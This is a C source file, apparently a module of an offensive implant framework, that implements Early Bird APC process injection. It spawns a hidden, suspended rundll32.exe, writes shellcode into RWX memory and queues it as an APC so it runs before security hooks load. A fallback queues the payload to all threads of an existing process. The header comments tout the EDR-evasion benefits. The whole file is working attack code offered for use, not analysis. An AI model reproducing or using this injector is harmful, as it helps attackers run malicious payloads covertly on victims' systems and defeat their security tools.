// early_bird -- Process injection via Early Bird APC.
//
// Technique:
//   1. Create a sacrificial process in SUSPENDED state
//   2. Allocate RWX memory in the child (before any DLLs initialize)
//   3. Write shellcode
//   4. Queue APC to the primary (suspended) thread
//   5. Resume the thread -- APC fires BEFORE ntdll!LdrInitializeThunk
//
// Why it works:
//   When a thread is created suspended (CREATE_SUSPENDED), it has a pending
//   APC slot. Upon ResumeThread, the kernel processes queued APCs BEFORE the
//   thread's start address runs. For the initial thread this means our APC
//   fires before TLS callbacks, DLL_PROCESS_ATTACH, and the process entry point.
//
// OPSEC advantages:
//   - APC fires before EDR's user-mode hooks are initialized (DLLs not loaded yet)
//   - No NtCreateThreadEx / CreateRemoteThread call
//   - Thread TID matches the process's main thread (not suspicious orphan thread)
//   - Works even if EDR hooks NtCreateThreadEx in user-mode
//   - Main thread's start address still points to legitimate ntdll!RtlUserThreadStart
//
// Handles SPAWN method only. For THREAD method, falls back to standard APC.

#include "../../process_inject_api.h"

// Forward declarations.
static void  pic_memset(void* dst, int val, uint32_t len);
static uint32_t do_early_bird(InjectCtx* ctx);
static uint32_t do_standard_apc(InjectCtx* ctx);

// ---- ENTRY POINT (must be first defined function) -------------------------

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    // Early Bird имеет смысл только для SPAWN (мы создаём процесс).
    // Для THREAD/APC с уже запущенным процессом — стандартная APC.
    if (ctx->method_hint == INJECT_METHOD_SPAWN || !ctx->target_process)
        return do_early_bird(ctx);
    return do_standard_apc(ctx);
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static uint32_t do_early_bird(InjectCtx* ctx) {
    uint16_t default_spawn[] = {
        'C',':','\\','W','i','n','d','o','w','s','\\',
        'S','y','s','t','e','m','3','2','\\',
        'r','u','n','d','l','l','3','2','.','e','x','e',0
    };

    uint16_t* cmd = (uint16_t*)ctx->spawn_to;
    if (!cmd || !cmd[0]) cmd = default_spawn;

    // STARTUPINFOW
    typedef struct {
        DWORD  cb; void* r1; void* r2; void* r3;
        DWORD  dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize;
        DWORD  dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute;
        DWORD  dwFlags; uint16_t wShowWindow; uint16_t cbReserved2;
        void*  lpReserved2;
        HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError;
    } SIW;

    typedef struct {
        HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;
    } PIW;

    SIW si;
    pic_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
    si.wShowWindow = 0;      // SW_HIDE

    PIW pi;
    pic_memset(&pi, 0, sizeof(pi));

    // CREATE_SUSPENDED | CREATE_NO_WINDOW
    BOOL ok = ctx->CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                                  0x00000004 | 0x08000000,
                                  NULL, NULL, &si, &pi);
    if (!ok) return INJECT_ERR_PROCESS;

    // Allocate RW in the child process.
    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        pi.hProcess, &base, 0, &sz, 0x3000, 0x40 /* PAGE_EXECUTE_READWRITE */);
    if (ns < 0 || !base) {
        ctx->TerminateProcess(pi.hProcess, 1);
        ctx->CloseHandle(pi.hThread);
        ctx->CloseHandle(pi.hProcess);
        return INJECT_ERR_ALLOC;
    }

    // Write shellcode.
    SIZE_T written = 0;
    ns = ctx->NtWriteVirtualMemory(
        pi.hProcess, base, (PVOID)ctx->payload, (SIZE_T)ctx->payload_len, &written);
    if (ns < 0) {
        ctx->TerminateProcess(pi.hProcess, 1);
        ctx->CloseHandle(pi.hThread);
        ctx->CloseHandle(pi.hProcess);
        return INJECT_ERR_WRITE;
    }

    // Queue APC to the suspended main thread.
    // При Resume этот APC сработает ДО инициализации процесса.
    ns = ctx->NtQueueApcThread(pi.hThread, base, NULL, NULL, NULL);
    if (ns < 0) {
        ctx->TerminateProcess(pi.hProcess, 1);
        ctx->CloseHandle(pi.hThread);
        ctx->CloseHandle(pi.hProcess);
        return INJECT_ERR_THREAD;
    }

    // Resume main thread -- APC fires immediately.
    ULONG prev = 0;
    ctx->NtResumeThread(pi.hThread, &prev);

    ctx->out_thread = pi.hThread;
    ctx->out_process = pi.hProcess;
    ctx->out_remote_base = base;
    return INJECT_OK;
}

static uint32_t do_standard_apc(InjectCtx* ctx) {
    HANDLE hp = ctx->target_process;
    if (!hp) return INJECT_ERR_PROCESS;

    PVOID base = NULL;
    SIZE_T sz = (SIZE_T)ctx->payload_len;
    NTSTATUS ns = ctx->NtAllocateVirtualMemory(
        hp, &base, 0, &sz, 0x3000, 0x04);
    if (ns < 0 || !base) return INJECT_ERR_ALLOC;

    SIZE_T written = 0;
    ctx->NtWriteVirtualMemory(hp, base, (PVOID)ctx->payload, (SIZE_T)ctx->payload_len, &written);

    PVOID pb = base; SIZE_T ps = (SIZE_T)ctx->payload_len; ULONG old = 0;
    ctx->NtProtectVirtualMemory(hp, &pb, &ps, 0x20, &old);

    ctx->out_remote_base = base;

    // Queue APC to threads.
    HANDLE snap = ctx->CreateToolhelp32Snapshot(0x00000004, 0);
    if (!snap || snap == (HANDLE)(LONG_PTR)-1) return INJECT_ERR_THREAD;

    typedef struct {
        DWORD dwSize; DWORD cntUsage; DWORD th32ThreadID;
        DWORD th32OwnerProcessID; LONG tpBasePri; LONG tpDeltaPri; DWORD dwFlags;
    } TE32;

    TE32 te;
    te.dwSize = sizeof(te);
    int queued = 0;
    if (ctx->Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != ctx->target_pid) continue;
            HANDLE hth = ctx->OpenThread(0x0010, FALSE, te.th32ThreadID);
            if (!hth) continue;
            if (ctx->NtQueueApcThread(hth, base, NULL, NULL, NULL) >= 0) ++queued;
            ctx->CloseHandle(hth);
        } while (ctx->Thread32Next(snap, &te));
    }
    ctx->CloseHandle(snap);
    return queued > 0 ? INJECT_OK : INJECT_ERR_THREAD;
}

static void pic_memset(void* dst, int val, uint32_t len) {
    volatile uint8_t* d = (volatile uint8_t*)dst;
    for (uint32_t i = 0; i < len; ++i) d[i] = (uint8_t)val;
}
